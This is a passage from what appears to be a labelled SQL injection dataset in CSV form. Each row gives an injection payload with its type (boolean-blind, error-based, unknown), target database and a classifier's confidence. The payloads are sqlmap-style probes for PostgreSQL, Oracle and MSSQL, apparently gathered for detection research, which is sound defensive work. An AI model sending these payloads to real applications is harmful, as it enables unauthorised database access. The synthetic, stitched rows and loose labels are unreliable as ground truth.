id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39963,"-5062 ) where 7457 = 7457 or username = ""-9987 ) ) ) and ( ( 8254 = 8254",unknown,generic,0.50,Insufficient data to classify payload type,1
39964,"-9564 AND username = ""1\' and \'fbzo\' like \'fbzo",unknown,generic,0.50,Insufficient data to classify payload type,1
39965,"select * from users WHERE username = ""1\'+ ( select oljg where 2006 = 2006 or username = ""1"" or username = ""-2348 ) as sige where 1639 = 1639",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39966,"-4610\' ) ) or username = ""-1254"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39967,"-6523"" and username = ""-6720\' ) ) ) or ( ( ( \'enfe\' like \'enfe",unknown,generic,0.50,Insufficient data to classify payload type,1
39968,"select * from users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39969,"select * from users WHERE username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1\'|| ( select \'byxb\' where 8351 = 8351",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39970,"1 and username = ""-6190\' ) where 2621 = 2621 and username = ""-5863",unknown,generic,0.50,Insufficient data to classify payload type,1
39971,"SELECT * FROM users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" AND username = ""-9501\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39972,"-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" and ( ( \'guxv\' = \'guxv"" and username = ""1"" or username = ""-1344 ) as gqgi where 2545 = 2545 and username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
39973,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-1549\' ) and ( \'fnwx\' = \'fnwx"" or username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39974,"select * from users WHERE username = ""-7209\' ) ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or ( ( ( \'stqx\' = \'stqx"" or username = ""1\' ) ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39975,1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39976,"-7199\' and username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39977,"-5062 ) where 7457 = 7457 or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1%\' ) ) ) or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
39978,1\'|| ( select \'byxb\' where 8351 = 8351 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) ||\',error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39979,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'ykjs\' like \'ykjs"" and username = ""-1190\' and \'yxry\' like \'yxry"" or username = ""1\'|| ( select \'yucg\' where 2576 = 2576",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39980,"select * from users WHERE username = ""-9501\' ) or username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39981,"-5585\' or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'",unknown,generic,0.50,Insufficient data to classify payload type,1
39982,"select * from users WHERE username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-4248 where 3288 = 3288",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39983,"select * from users WHERE username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39984,"select * from users WHERE username = ""-1254"" or username = ""-7209\' ) ) ) or username = ""-1254"" and username = ""1 ) where 3381 = 3381",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39985,"select * from users WHERE username = ""-5863"" or username = ""-2806\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
39986,"1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248"" and \'nmdq\' like \'nmdq",unknown,generic,0.50,Insufficient data to classify payload type,1
39987,"select * from users WHERE username = ""1"" or username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" and username = ""-9688%\' ) ) and ( ( \'%\' = \'"" or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39988,"select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" and username = ""1"" or username = ""1\' and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39989,-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39990,"select * from users WHERE username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb"" or username = ""1\' ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39991,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-1254"" or username = ""-4248 where 3288 = 3288",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39992,"select * from users WHERE username = ""1"" or username = ""-3424\' ) ) and username = ""1 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39993,"-9564 OR username = ""1\' ) as pogx where 4105 = 4105 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39994,"select * from users WHERE username = ""1 or username = ""-5062 ) where 7457 = 7457 or username = ""-8860 ) or username = ""-9564",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39995,"select * from users WHERE username = ""1 ) where 3381 = 3381 and username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39996,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""1"" or username = ""-9505\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39997,"-9501\' ) or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39998,"1\' ) ) ) and username = ""1%\' and \'%\' = \'"" or username = ""-1641\' ) ) and ( ( \'vgcb\' like \'vgcb",unknown,generic,0.50,Insufficient data to classify payload type,1
39999,"-9295 ) ) ) or username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""1"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40000,"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""1%\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40001,"-5863"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40002,"-3899\' ) where 8152 = 8152 or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
40003,"select * from users WHERE username = ""1\' ) ) ) or username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40004,"select * from users WHERE username = ""-6665\' ) ) ) and ( ( ( \'winx\' = \'winx"" or username = ""1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40005,"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 and \'qibr\' = \'qibr"" and username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
40006,"1\' ) ) and username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
40007,"select * from users WHERE username = ""-6036 ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40008,"select * from users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""1"" or username = ""-6190\' ) where 2621 = 2621",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40009,"1"" and ( ( ( 1248 = 1248",unknown,generic,0.50,Insufficient data to classify payload type,1
40010,"-1344 ) as gqgi where 2545 = 2545 and username = ""-9987 ) ) ) or# ( ( ( 2114 = 2114",unknown,generic,0.50,Insufficient data to classify payload type,1
40011,"select * from users WHERE username = ""-1254"" or username = ""-7209\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-7199\'",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40012,"-4322\' ) ) as magw where 1627 = 1627 and username = ""1\' ) ) and ( ( \'yhku\' like \'yhku",unknown,generic,0.50,Insufficient data to classify payload type,1
40013,"sElEct * from usErs whErE usErnamE = ""1\' ) ) as plbt whErE 4368 = 4368",benign,generic,0.50,Legitimate SQL query without attack signals,1
40014,"1%"" and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka",unknown,generic,0.50,Insufficient data to classify payload type,1
40015,"select * from users WHERE username = ""-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp"" or username = ""1"" and username = ""-1344 ) as gqgi where 2545 = 2545",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40016,"select * from users WHERE username = ""-1254"" and ( ( ( \'iuki\' = \'iuki"" or username = ""1%"" and username = ""1\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40017,"1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627 and username = ""-4610\' ) ) and ( ( \'hdco\' = \'hdco",unknown,generic,0.50,Insufficient data to classify payload type,1
40018,"select * from users WHERE username = ""1"" or username = ""-6190\' ) where 2621 = 2621 and username = ""1"" and username = ""-5313\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40019,"select * from users WHERE username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or username = ""1\' ) ) as eltx where 9955 = 9955",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40020,"1\' ) and username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40021,1\' ) ) ) and ( ( ( \'abcf\' like \'abcf,unknown,generic,0.50,Insufficient data to classify payload type,1
40022,"-1254"" and ( 3530 = 3530"" and username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40023,"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 and ( \'fnwx\' = \'fnwx"" or username = ""-7242\' or username = ""1\'+ ( select oljg where 2006 = 2006",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40024,"1\'+ ( select onzd where 8452 = 8452 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk",unknown,generic,0.50,Insufficient data to classify payload type,1
40025,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" and username = ""-5313\' ) ) ) and ( ( ( \'wkkp\' like \'wkkp",unknown,generic,0.50,Insufficient data to classify payload type,1
40026,"-1641\' ) ) or username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" or username = ""-1854\' ) as fmmq where 7326 = 7326 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40027,"-6190\' ) where 2621 = 2621 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
40028,"select * from users WHERE username = ""1 ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" or username = ""-2374 )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40029,"select * from users WHERE username = ""1%"" and username = ""1\' ) ) and ( ( \'ajka\' = \'ajka"" and username = ""1%"" and username = ""-5313\' ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40030,-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
40031,"select * from users WHERE username = ""-5863"" and username = ""1 ) ) and ( ( 5139 = 5139"" and username = ""1\' in boolean mode )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
40032,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" and username = ""1\' and \'fbzo\' like \'fbzo",unknown,generic,0.50,Insufficient data to classify payload type,1
40033,"select * from users WHERE username = ""1"" or username = ""-8860 ) or username = ""-9564",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
40034,"-9688%\' ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-1254",unknown,generic,0.50,Insufficient data to classify payload type,1
